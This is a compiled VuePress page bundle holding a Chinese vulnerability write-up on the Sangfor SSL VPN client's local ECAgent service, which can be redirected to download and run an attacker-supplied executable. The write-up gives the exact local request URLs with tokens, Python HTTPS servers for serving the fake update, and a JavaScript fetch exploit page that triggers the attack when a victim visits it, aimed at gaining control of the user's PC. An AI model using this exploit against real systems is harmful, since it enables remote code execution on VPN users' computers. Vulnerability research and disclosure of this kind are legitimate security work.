import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as t,c as i,a as n,b as a,d as o,e as c}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),d=n("p",null,"深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行",-1),u=n("p",null,"参考阅读：",-1),k={href:"https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg",target:"_blank",rel:"noopener noreferrer"},v=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>深信服 SSL VPN
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>百度&quot;intitle: 欢迎使用SSL VPN&quot;，随便找一个地方下载VPN客户端下载安装：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917573.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>安装完之后访问VPN的页面，发现VPN会自动下载组件更新：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917218.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这些请求均为GET请求并附带着一些参数，我们把它一一列下来：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917102.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>本地来看一下这个<code>54530</code>端口对应的进程是什么：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917296.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917851.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对<code>127.0.0.1</code>的访问从而引起VPN进行组件更新。</p><p>通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。</p><p>再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>InitECAgent -&gt; 初始化
GetEncryptKey -&gt; 获取加密密钥
DoConfigure -&gt; 配置
CheckReLogin -&gt; 检查重新登录
CheckProxySetting -&gt; 检查代理设置
UpdateControls -&gt; 更新控制
DoQueryService -&gt; 查询服务
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>第一个初始化的请求存在可控参数arg1：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=vpn.xxx.edu.cn%20443&amp;callback=EA_cb10000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参数<code>arg1=vpn.xxx.edu.cn%20443</code>，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为<code>172.20.10.2 8000</code>，然后本地搭建一个HTTP服务：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>python -m SimpleHTTPServer
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其他的请求原封不动，依次请求一遍那一份URL</p><p>服务端成功收到请求，但是却出现了错误的提示：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091917373.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。</p><p>现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。</p><p>如下脚本基于Python库建立一个 HTTPS 服务：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</span>

<span class="token keyword">import</span> BaseHTTPServer<span class="token punctuation">,</span> SimpleHTTPServer
<span class="token keyword">import</span> ssl

httpd <span class="token operator">=</span> BaseHTTPServer<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SimpleHTTPServer<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span>
httpd<span class="token punctuation">.</span>socket <span class="token operator">=</span> ssl<span class="token punctuation">.</span>wrap_socket <span class="token punctuation">(</span>httpd<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> certfile<span class="token operator">=</span><span class="token string">&#39;./server.pem&#39;</span><span class="token punctuation">,</span> server_side<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091918528.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看见客户端会访问两个文件：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/com/WindowsModule.xml
/com/win/XXXUD.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> BaseHTTPServer
<span class="token keyword">import</span> SimpleHTTPServer
<span class="token keyword">import</span> cgi
<span class="token keyword">import</span> ssl

<span class="token keyword">class</span> <span class="token class-name">ServerHandler</span><span class="token punctuation">(</span>SimpleHTTPServer<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        form <span class="token operator">=</span> cgi<span class="token punctuation">.</span>FieldStorage<span class="token punctuation">(</span><span class="token punctuation">)</span>
        SimpleHTTPServer<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">.</span>do_GET<span class="token punctuation">(</span>self<span class="token punctuation">)</span>

Handler <span class="token operator">=</span> ServerHandler

httpd <span class="token operator">=</span> BaseHTTPServer<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
httpd<span class="token punctuation">.</span>socket <span class="token operator">=</span> ssl<span class="token punctuation">.</span>wrap_socket <span class="token punctuation">(</span>httpd<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> certfile<span class="token operator">=</span><span class="token string">&#39;./server.pem&#39;</span><span class="token punctuation">,</span> server_side<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最终如上脚本支持<code>POST</code>方法，当时用<code>POST</code>方法请求时即返回文件内容。</p><p>最后，拖一个<code>calc.exe</code>（计算器）到HTTPS网站根目录下的<code>/com/win/XXXUD.exe</code>。</p><p>依次请求（<strong>经过多次复现发现，这三个请求才是重点的，其他的可以忽略</strong>）：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=172.20.10.2 8000&amp;callback=EA_cb10000

https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&amp;token=50065256e83ff1bb9e01757d0d22b669&amp;callback=EA_cb10003

https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;callback=EA_cb10005
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091918246.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    <span class="token comment">// 服务器IP和端口</span>
    <span class="token keyword">var</span> ip <span class="token operator">=</span> <span class="token string">&quot;172.20.10.2&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> port <span class="token operator">=</span> <span class="token string">&quot;4443&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> poc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=&quot;</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">&quot; &quot;</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">&quot;&amp;Guid=&amp;callback=EA_cb10000&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&amp;token=c4202416e283e60809d3b1e04e4bae6b&amp;Guid=&amp;callback=EA_cb10003&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;Guid=&amp;callback=EA_cb10005&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>poc_list<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token function">fetch</span><span class="token punctuation">(</span>poc_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;2000&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的<code>/com/win/</code>目录下有一个<code>XXXUD.exe</code>文件。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091918424.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,44);function b(m,g){const s=p("ExternalLinkIcon");return t(),i("div",null,[r,d,u,n("ul",null,[n("li",null,[n("a",k,[a("https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg"),o(s)])])]),v])}const T=e(l,[["render",b],["__file","深信服 SSL VPN 客户端远程文件下载.html.vue"]]);export{T as default};
